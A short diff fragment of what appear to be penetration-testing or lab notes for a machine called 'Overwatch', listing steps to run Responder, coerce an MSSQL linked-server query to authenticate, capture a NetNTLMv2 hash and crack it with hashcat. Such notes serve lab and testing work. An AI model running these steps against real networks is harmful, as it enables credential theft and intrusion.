@@ -16,3 +16,5 @@ Used on: **Overwatch** — combined with a rogue A-record (see `dnstool.md`) to 
 2. Start `responder -I tun0`.
 3. Trigger MSSQL query: `EXEC ('SELECT @@version') AT SQL07;`
 4. Captured NetNTLMv2 hash → crack with `hashcat -m 5600`.
+
+
